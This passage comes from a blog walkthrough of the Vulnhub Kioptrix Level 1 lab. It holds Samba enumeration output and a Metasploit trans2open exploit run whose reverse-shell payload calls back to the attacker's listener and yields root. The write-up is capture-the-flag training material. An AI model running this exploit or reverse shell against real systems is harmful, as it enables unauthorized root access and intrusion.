2.2.1a]</div><div class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</div><div class="line"></div><div class="line">	Sharename       Type      Comment</div><div class="line">	---------       ----      -------</div><div class="line">	IPC$            IPC       IPC Service (Samba Server)</div><div class="line">	ADMIN$          IPC       IPC Service (Samba Server)</div><div class="line"></div><div class="line">	Server               Comment</div><div class="line">	---------            -------</div><div class="line">	KIOPTRIX             Samba Server</div><div class="line"></div><div class="line">	Workgroup            Master</div><div class="line">	---------            -------</div><div class="line">	MYGROUP              KIOPTRIX</div><div class="line"></div><div class="line">[+] Attempting to map shares on 192.168.136.128</div><div class="line">//192.168.136.128/IPC$	[E] Can't understand response:</div><div class="line">WARNING: The <span class="string">"syslog"</span> option is deprecated</div><div class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</div><div class="line">NT_STATUS_NETWORK_ACCESS_DENIED listing \*</div><div class="line">//192.168.136.128/ADMIN$	[E] Can<span class="string">'t understand response:</span></div><div class="line">WARNING: The "syslog" option is deprecated</div><div class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</div><div class="line">tree connect failed: NT_STATUS_WRONG_PASSWORD</div><div class="line"></div><div class="line"> ======================================================= </div><div class="line">|    Password Policy Information for 192.168.136.128    |</div><div class="line"> ======================================================= </div><div class="line">[E] Unexpected error from polenum:</div><div class="line">Traceback (most recent call last):</div><div class="line">  File "/usr/bin/polenum", line 33, in &lt;module&gt;</div><div class="line">    from impacket.dcerpc import dcerpc_v4, dcerpc, transport, samr</div><div class="line">ImportError: cannot import name dcerpc_v4</div><div class="line">[+] Retieved partial password policy with rpcclient:</div><div class="line"></div><div class="line">Password Complexity: Disabled</div><div class="line">Minimum Password Length: 0</div><div class="line"></div><div class="line"></div><div class="line"> ================================= </div><div class="line">|    Groups on 192.168.136.128    |</div><div class="line"> ================================= </div><div class="line"></div><div class="line">[+] Getting builtin groups:</div><div class="line">group:[Administrators] rid:[0x220]</div><div class="line">group:[Users] rid:[0x221]</div><div class="line">group:[Guests] rid:[0x222]</div><div class="line">group:[Power Users] rid:[0x223]</div><div class="line">group:[Account Operators] rid:[0x224]</div><div class="line">group:[System Operators] rid:[0x225]</div><div class="line">group:[Print Operators] rid:[0x226]</div><div class="line">group:[Backup Operators] rid:[0x227]</div><div class="line">group:[Replicator] rid:[0x228]</div><div class="line"></div><div class="line">[+] Getting builtin group memberships:</div><div class="line">Group 'Backup Operators<span class="string">' (RID: 551) has member: Couldn'</span>t find group Backup Operators</div><div class="line">Group <span class="string">'Print Operators'</span> (RID: 550) has member: Couldn<span class="string">'t find group Print Operators</span></div><div class="line">Group 'Account Operators<span class="string">' (RID: 548) has member: Couldn'</span>t find group Account Operators</div><div class="line">Group <span class="string">'Guests'</span> (RID: 546) has member: Couldn<span class="string">'t find group Guests</span></div><div class="line">Group 'Users<span class="string">' (RID: 545) has member: Couldn'</span>t find group Users</div><div class="line">Group <span class="string">'Administrators'</span> (RID: 544) has member: Couldn<span class="string">'t find group Administrators</span></div><div class="line">Group 'Power Users<span class="string">' (RID: 547) has member: Couldn'</span>t find group Power Users</div><div class="line">Group <span class="string">'System Operators'</span> (RID: 549) has member: Couldn<span class="string">'t find group System Operators</span></div><div class="line">Group 'Replicator<span class="string">' (RID: 552) has member: Couldn'</span>t find group Replicator</div><div class="line"></div><div class="line">[+] Getting <span class="built_in">local</span> groups:</div><div class="line">group:[sys] rid:[0x3ef]</div><div class="line">group:[tty] rid:[0x3f3]</div><div class="line">group:[disk] rid:[0x3f5]</div><div class="line">group:[mem] rid:[0x3f9]</div><div class="line">group:[kmem] rid:[0x3fb]</div><div class="line">group:[wheel] rid:[0x3fd]</div><div class="line">group:[man] rid:[0x407]</div><div class="line">group:[dip] rid:[0x439]</div><div class="line">group:[lock] rid:[0x455]</div><div class="line">group:[users] rid:[0x4b1]</div><div class="line">group:[slocate] rid:[0x413]</div><div class="line">group:[floppy] rid:[0x40f]</div><div class="line">group:[utmp] rid:[0x415]</div><div class="line"></div><div class="line">[+] Getting <span class="built_in">local</span> group memberships:</div><div class="line"></div><div class="line">[+] Getting domain groups:</div><div class="line">group:[Domain Admins] rid:[0x200]</div><div class="line">group:[Domain Users] rid:[0x201]</div><div class="line"></div><div class="line">[+] Getting domain group memberships:</div><div class="line">Group <span class="string">'Domain Admins'</span> (RID: 512) has member: Couldn<span class="string">'t find group Domain Admins</span></div><div class="line">Group 'Domain Users<span class="string">' (RID: 513) has member: Couldn'</span>t find group Domain Users</div><div class="line"></div><div class="line"> ========================================================================== </div><div class="line">|    Users on 192.168.136.128 via RID cycling (RIDS: 500-550,1000-1050)    |</div><div class="line"> ========================================================================== </div><div class="line">[I] Found new SID: S-1-5-21-4157223341-3243572438-1405127623</div><div class="line">[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username <span class="string">''</span>, password <span class="string">''</span></div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-500 KIOPTRIX\</div><div class="line">                                                        (0)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-501 KIOPTRIX\ (0)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)</div><div class="line">S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)</div><div class="line"></div><div class="line"> ================================================ </div><div class="line">|    Getting printer info <span class="keyword">for</span> 192.168.136.128    |</div><div class="line"> ================================================ </div><div class="line">No printers returned.</div></pre></td></tr></table></figure></p>
+<p>So, Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a], interesting. We hunt for this exploit on metaspoilt and use Trans2Open exploit for Linux.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">msf&gt; exploit/linux/samba/trans2open</div><div class="line">msf&gt; show options</div><div class="line">--------------------------------------------------------------------------------------------------------</div><div class="line">Module options (exploit/linux/samba/trans2open):</div><div class="line"></div><div class="line">   Name   Current Setting  Required  Description</div><div class="line">   ----   ---------------  --------  -----------</div><div class="line">   RHOST  192.168.136.128  yes       The target address</div><div class="line">   RPORT  139              yes       The target port</div><div class="line"></div><div class="line"></div><div class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</div><div class="line"></div><div class="line">   Name          Current Setting  Required  Description</div><div class="line">   ----          ---------------  --------  -----------</div><div class="line">   DebugOptions  0                no        Debugging options <span class="keyword">for</span> POSIX meterpreter</div><div class="line">   LHOST         192.168.136.1    yes       The listen address</div><div class="line">   LPORT         4444             yes       The listen port</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Samba 2.2.x - Bruteforce</div><div class="line">---------------------------------------------------------------------------------------------------------</div><div class="line">msf&gt; exploit</div><div class="line">---------------------------------------------------------------------------------------------------------</div><div class="line">[*] Started reverse TCP handler on 192.168.136.1:4444 </div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</div><div class="line">[*] Transmitting intermediate stager <span class="keyword">for</span> over-sized stage...(105 bytes)</div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffff9fc...</div><div class="line">[*] Sending stage (1495599 bytes) to 192.168.136.128</div><div class="line">[-] OpenSSL::SSL::SSLError SSL_accept SYSCALL returned=5 errno=0 state=SSLv2/v3 <span class="built_in">read</span> client hello A</div><div class="line">[*] Transmitting intermediate stager <span class="keyword">for</span> over-sized stage...(105 bytes)</div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffff8fc...</div><div class="line">[*] Sending stage (1495599 bytes) to 192.168.136.128</div><div class="line">[-] OpenSSL::SSL::SSLError SSL_accept SYSCALL returned=5 errno=0 state=SSLv2/v3 <span class="built_in">read</span> client hello A</div><div class="line">[*] Transmitting intermediate stager <span class="keyword">for</span> over-sized stage...(105 bytes)</div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffff7fc...</div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffff6fc...</div><div class="line">[*] Sending stage (1495599 bytes) to 192.168.136.128</div><div class="line">[-] OpenSSL::SSL::SSLError SSL_accept SYSCALL returned=5 errno=0 state=SSLv2/v3 <span class="built_in">read</span> client hello A</div><div class="line">[*] Transmitting intermediate stager <span class="keyword">for</span> over-sized stage...(105 bytes)</div><div class="line">----------------------------------------------------------------------------------------------------------</div></pre></td></tr></table></figure></p>
+<p>So, there seems to still be some problem with SSL. This was a little confusing, but playing around with MSF and the different payloads made me realize there is some problem in the payload - linux/x86/meterpreter/reverse_tcp. Hence, I changed the payload to generic/shell_reverse_tcp.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">msf exploit(trans2open) &gt; <span class="built_in">set</span> payload generic/shell_reverse_tcp </div><div class="line">payload =&gt; generic/shell_reverse_tcp</div><div class="line">msf exploit(trans2open) &gt; show options </div><div class="line">----------------------------------------------------------------------------------------------------------</div><div class="line">Module options (exploit/linux/samba/trans2open):</div><div class="line"></div><div class="line">   Name   Current Setting  Required  Description</div><div class="line">   ----   ---------------  --------  -----------</div><div class="line">   RHOST  192.168.136.128  yes       The target address</div><div class="line">   RPORT  139              yes       The target port</div><div class="line"></div><div class="line"></div><div class="line">Payload options (generic/shell_reverse_tcp):</div><div class="line"></div><div class="line">   Name   Current Setting  Required  Description</div><div class="line">   ----   ---------------  --------  -----------</div><div class="line">   LHOST  192.168.136.1    yes       The listen address</div><div class="line">   LPORT  4444             yes       The listen port</div><div class="line"></div><div class="line"></div><div class="line">Exploit target:</div><div class="line"></div><div class="line">   Id  Name</div><div class="line">   --  ----</div><div class="line">   0   Samba 2.2.x - Bruteforce</div><div class="line">-----------------------------------------------------------------------------------------------------------</div><div class="line">msf exploit(trans2open) &gt; exploit </div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.136.1:4444 </div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</div><div class="line">[*] 192.168.136.128:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</div><div class="line">[*] Command shell session 1 opened (192.168.136.1:4444 -&gt; 192.168.136.128:1041) at 2017-02-26 09:31:18 +0530</div><div class="line"></div><div class="line">id</div><div class="line">uid=0(root) gid=0(root) groups=99(nobody)</div></pre></td></tr></table></figure></p>
+<p><strong><em>Pwned</em></strong>! The final flag was not hard to find.</p>
+<h2 id="Flag-gt-cat-var-mail-root"><a href="#Flag-gt-cat-var-mail-root" class="headerlink" title="Flag =&gt; cat /var/mail/root"></a>Flag =&gt; cat /var/mail/root</h2><blockquote><p>From root  Sat Sep 26 11:42:10 2009<br>Return-Path: <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x72;&#x6f;&#111;&#116;&#64;&#x6b;&#x69;&#111;&#112;&#116;&#105;&#x78;&#x2e;&#108;&#101;&#x76;&#101;&#108;&#49;">&#x72;&#x6f;&#111;&#116;&#64;&#x6b;&#x69;&#111;&#112;&#116;&#105;&#x78;&#x2e;&#108;&#101;&#x76;&#101;&#108;&#49;</a><br>Received: (from root@localhost)<br>    by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831<br>    for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400<br>Date: Sat, 26 Sep 2009 11:42:10 -0400<br>From: root <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#114;&#x6f;&#111;&#116;&#x40;&#x6b;&#105;&#x6f;&#112;&#116;&#x69;&#x78;&#46;&#x6c;&#101;&#x76;&#101;&#108;&#49;">&#114;&#x6f;&#111;&#116;&#x40;&#x6b;&#105;&#x6f;&#112;&#116;&#x69;&#x78;&#46;&#x6c;&#101;&#x76;&#101;&#108;&#49;</a><br>Message-Id: <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#50;&#48;&#48;&#57;&#x30;&#x39;&#x32;&#x36;&#x31;&#53;&#52;&#50;&#46;&#x6e;&#56;&#x51;&#x46;&#x67;&#65;&#x5a;&#48;&#49;&#56;&#51;&#x31;&#64;&#x6b;&#x69;&#x6f;&#x70;&#x74;&#x69;&#x78;&#x2e;&#108;&#101;&#118;&#x65;&#108;&#x31;">&#50;&#48;&#48;&#57;&#x30;&#x39;&#x32;&#x36;&#x31;&#53;&#52;&#50;&#46;&#x6e;&#56;&#x51;&#x46;&#x67;&#65;&#x5a;&#48;&#49;&#56;&#51;&#x31;&#64;&#x6b;&#x69;&#x6f;&#x70;&#x74;&#x69;&#x78;&#x2e;&#108;&#101;&#118;&#x65;&#108;&#x31;</a><br>To: root@kioptix.level1<br>Subject: About Level 2<br>Status: O</p>
+<p>If you are reading this, you got root. Congratulations.<br>Level 2 won’t be as easy…</p>
+</blockquote>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/Vulnhub/">#Vulnhub</a> <a href="/tags/Kioptrix/">#Kioptrix</a> <a href="/tags/Kioptrix-level-1/">#Kioptrix level 1</a> <a href="/tags/OSCP-Series/">#OSCP Series</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+    <div class="comments">
+        
+<div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+
+
+    </div>
+    
+
+</div>
+
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2><a href="https://oneplus-x.github.io/about">About</a></h2>
+                <p>
+                    "I Just don't know what i am doing with?"
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2017/06/11/Enterprise-Offense-IT-Operations-Part-1/">Enterprise Offense: IT Op</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/03/12/Vulnhub-Pluck/">Vulnhub: Pluck 1</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/02/25/kioptrix-1/">Vulnhub - OSCP Series - K</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/02/25/ISP-Hacking/">All your creds are belong</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://oneplus.github.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/One_PlusX?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/One Plus - X/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+
+                    
+                    <li class="list-inline-item">
+                        <a href="https://medium.com/@oneplus">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-medium"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+
+                    
+                    <li class="list-inline-item">
+                        <a href="https://oneplus.herokuapp.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-slack"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+
+                    
+                    <li class="list-inline-item">
+                        <a href="https://t.me/oneplus">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-telegram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:weirdless@yandex.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="/atom.xml">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    If your actions inspire others to dream more, learn more, do more and become more, you are a leader.
+                </div>
+            </div>
+        </div>
+    </div>
+<!-- Start of SimpleHitCounter Code -->
+<div align="center">A simple hit counter only for my reference: <a href="https://oneplus.github.io" target="_blank"><img src="http://simplehitcounter.com/hit.php?uid=2280563&f=16777215&b=0" border="0" height="18" width="83" alt="web counter"></a></div>
+<!-- End of SimpleHitCounter Code -->
+
+</footer>
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
